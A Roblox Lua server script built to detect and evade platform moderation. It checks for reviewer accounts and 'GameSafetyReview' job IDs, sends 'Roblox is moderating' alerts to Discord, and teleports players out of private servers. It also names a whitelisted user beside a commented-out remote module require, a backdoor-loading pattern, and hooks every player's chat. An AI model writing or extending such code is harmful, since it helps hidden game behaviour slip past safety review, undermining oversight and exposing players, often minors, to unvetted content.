while task.wait() do
	if #game.Players:GetPlayers() == 0 then

	else
		for i,v in pairs(game:GetService('Players'):GetPlayers()) do
			if v.Name == "Player" or v.UserId == 0 or v.UserId == '' then -- check 4
				SendDiscordMessage("check 4 was tripped", 'red', 'none', 'âš  Roblox is moderating âš ')
				return
			elseif v.Name == 'WickedLawsWitchLVL4' then
				print('Whitelisted detected')
				--require(16925545018)()
				--return
			end
		end
		if game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= nil then
			wait(3)
			for i,player in pairs(game:GetService('Players'):GetPlayers()) do
				game:GetService("TeleportService"):Teleport(game.PlaceId, player)
			end

			game:GetService('Players').PlayerAdded:Connect(function(player)
				game:GetService("TeleportService"):Teleport(game.PlaceId, player)
			end)
			return
		end
		if game.PrivateServerId ~= "" and game.PrivateServerOwnerId == nil then
			wait(3)
			for i,player in pairs(game:GetService('Players'):GetPlayers()) do
				game:GetService("TeleportService"):Teleport(game.PlaceId, player)
			end

			game:GetService('Players').PlayerAdded:Connect(function(player)
				game:GetService("TeleportService"):Teleport(game.PlaceId, player)
			end)
			return
		end
		if game.JobId:sub(1, 17) == "GameSafetyReview" then -- check 1
			SendDiscordMessage("check 1 was tripped", 'red', 'none', 'âš  Roblox is moderating âš ')
			return
		end
		if #game.JobId ~= 36 then -- check 2
			SendDiscordMessage("check 2 was tripped", 'red', 'none', 'âš  Roblox is moderating âš ')
			return
		end
		if string.find(game.JobId, "/") then -- check 3
			SendDiscordMessage("check 3 was tripped", 'red', 'none', 'âš  Roblox is moderating âš ')
			return
		end
		for i,player in pairs(game:GetService('Players'):GetPlayers()) do
			connectchat(player)
		end

		game:GetService('Players').PlayerAdded:Connect(function(player)
			connectchat(player)
		end)
		return
	end
end
